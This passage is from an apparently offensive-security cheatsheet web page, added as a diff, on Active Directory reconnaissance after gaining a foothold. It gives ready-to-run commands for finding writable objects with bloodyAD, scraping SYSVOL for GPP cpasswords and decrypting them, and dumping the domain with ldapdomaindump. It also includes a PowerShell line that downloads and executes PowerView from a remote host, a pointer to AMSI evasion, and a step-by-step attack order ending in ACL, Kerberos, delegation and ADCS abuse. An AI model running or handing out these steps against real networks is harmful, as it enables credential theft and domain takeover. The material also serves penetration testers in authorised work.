+</span></span><span class="line"><span class="cl"><span class="c1">## Output a BloodHound-compatible zip with just the writable objects:</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get writable --bh
+</span></span><span class="line"><span class="cl"><span class="c1">## Filter to object type and right type:</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get writable --otype USER --right WRITE
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get writable --otype COMPUTER --right ALL --detail
+</span></span></code></pre></div><p>The output tells you exactly which attributes you can write on which objects. Every entry is an ACL abuse candidate, see <a href="https://jinpwn.dev/cheatsheets/active-directory/ad07-acl-abuse/">ACL Abuse</a>
+.</p>
+<h2 id="v-gpp-cpassword-and-sysvol-scrape" data-heading-permalink="true"><span class="heading-content">v. GPP cpassword and SYSVOL scrape</span>
+    <a class="heading-permalink" href="#v-gpp-cpassword-and-sysvol-scrape" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>SYSVOL is readable by every authenticated user. Old GPP files still have cpasswords:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> -M gpp_password
+</span></span><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> -M gpp_autologin
+</span></span><span class="line"><span class="cl"><span class="c1">## Manual scrape:</span>
+</span></span><span class="line"><span class="cl">mount -t cifs <span class="s2">&#34;//</span><span class="nv">$DC</span><span class="s2">/SYSVOL&#34;</span> /mnt/sysvol -o <span class="nv">user</span><span class="o">=</span><span class="nv">$USER</span>,password<span class="o">=</span><span class="nv">$PASS</span>
+</span></span><span class="line"><span class="cl">grep -RIE <span class="s1">&#39;cpassword|password|Password&#39;</span> /mnt/sysvol/ 2&gt;/dev/null
+</span></span></code></pre></div><p>Decrypt cpassword (key is public):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gpp-decrypt <span class="s1">&#39;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#39;</span>
+</span></span></code></pre></div><h2 id="vi-ldapdomaindump-for-a-full-html-report" data-heading-permalink="true"><span class="heading-content">vi. ldapdomaindump for a full HTML report</span>
+    <a class="heading-permalink" href="#vi-ldapdomaindump-for-a-full-html-report" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Easy-to-read enum dump for the report or for sharing:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapdomaindump <span class="nv">$DC</span> -u <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="nv">$PASS</span> -o ldd-out
+</span></span><span class="line"><span class="cl"><span class="c1">## Or with hash:</span>
+</span></span><span class="line"><span class="cl">ldapdomaindump <span class="nv">$DC</span> -u <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p :<span class="s2">&#34;</span><span class="nv">$NTHASH</span><span class="s2">&#34;</span> -o ldd-out
+</span></span><span class="line"><span class="cl"><span class="c1">## Outputs: domain_users.html, domain_computers.html, domain_groups.html, domain_policy.html, domain_trusts.html</span>
+</span></span></code></pre></div><h2 id="vii-powerview-when-you-have-a-windows-foothold" data-heading-permalink="true"><span class="heading-content">vii. PowerView (when you have a Windows foothold)</span>
+    <a class="heading-permalink" href="#vii-powerview-when-you-have-a-windows-foothold" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>When you&rsquo;re already on a domain-joined Windows host, PowerView is still the cleanest in-process AD recon. AMSI bypass first, see <a href="https://jinpwn.dev/cheatsheets/windows/w10-defender--amsi-evasion/">Defender &amp; AMSI Evasion</a>
+.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.1/PowerView.ps1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-NetUser</span> <span class="p">|</span> <span class="nb">select </span><span class="n">samaccountname</span><span class="p">,</span><span class="n">description</span><span class="p">,</span><span class="n">memberof</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-NetGroup</span> <span class="s1">&#39;Domain Admins&#39;</span> <span class="p">|</span> <span class="nb">Get-NetGroupMember</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-NetComputer</span> <span class="p">|</span> <span class="nb">select </span><span class="n">dnshostname</span><span class="p">,</span><span class="n">operatingsystem</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainController</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainTrust</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainOU</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainGPO</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Find-DomainUserLocation</span> <span class="n">-ComputerIdentity</span> <span class="s1">&#39;DC01&#39;</span>    <span class="c">## who&#39;s logged on where</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Find-DomainShare</span>
+</span></span><span class="line"><span class="cl"><span class="c">## Look for stale objects:</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainUser</span> <span class="n">-PreauthNotRequired</span>                  <span class="c">## ASREP-roastable</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainUser</span> <span class="n">-SPN</span>                                 <span class="c">## Kerberoastable</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainUser</span> <span class="n">-TrustedToAuth</span>                       <span class="c">## constrained delegation</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainComputer</span> <span class="n">-Unconstrained</span>
+</span></span></code></pre></div><h2 id="viii-order-of-operations-on-a-fresh-ad-foothold" data-heading-permalink="true"><span class="heading-content">viii. Order of operations on a fresh AD foothold</span>
+    <a class="heading-permalink" href="#viii-order-of-operations-on-a-fresh-ad-foothold" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<ol>
+<li><code>nxc smb $DC</code> / <code>nxc ldap $DC</code> to confirm domain and signing posture</li>
+<li>Pre-auth: kerbrute userenum, anonymous asreproast (<code>-u '' -p ''</code>)</li>
+<li>With creds: full nxc sweep (section ii)</li>
+<li><code>bloodyAD get writable --bh</code> immediately, see what your account can already abuse</li>
+<li>Collect BloodHound data, see <a href="https://jinpwn.dev/cheatsheets/active-directory/ad02-bloodhound/">BloodHound</a>
+</li>
+<li>Read attack paths in BloodHound, work the shortest path</li>
+<li>ACL abuse, see <a href="https://jinpwn.dev/cheatsheets/active-directory/ad07-acl-abuse/">ACL Abuse</a>
+</li>
+<li>Kerberos attacks (<a href="https://jinpwn.dev/cheatsheets/active-directory/ad03-kerberoasting/">Kerberoasting</a>
+, <a href="https://jinpwn.dev/cheatsheets/active-directory/ad04-as-rep-roasting/">AS-REP Roasting</a>
+)</li>
+<li>Delegation (<a href="https://jinpwn.dev/cheatsheets/active-directory/ad08-delegation/">Delegation</a>
+) and ADCS (<a href="https://jinpwn.dev/cheatsheets/active-directory/ad09-adcs-esc1-16/">ADCS ESC1-16</a>
+)</li>
+</ol>
+<div class="obsidian-callout callout-tip">
+  <div class="obsidian-callout-header">
+    <div class="obsidian-callout-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"></path></svg>
+    </div>
+    <span class="obsidian-callout-title">Time saver</span>
+  </div>
+  <div class="obsidian-callout-body">
+    <p>If you have ANY valid credential, jump to BloodHound first. The graph tells you the shortest path. Manual enum is for filling gaps the graph leaves out.</p>
+  </div>
+</div>
+
+        </div>
+
+        
+          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/active-directory/00-ad-moc/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Previous</span>
+              <span class="cheatsheet-pager-title">AD MOC</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/active-directory/ad02-bloodhound/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Next</span>
+              <span class="cheatsheet-pager-title">BloodHound</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a></nav>
+        
+      </div>
+    </div>
+  </article>
+  
+
+  </main>
+  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M12 18V6"></path>
+      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
+    </svg>
+  </button>
+  <footer class="site-footer">
+  <p>&copy; 2026 JinPwn</p>
+</footer>
+
+</body>
+</html>
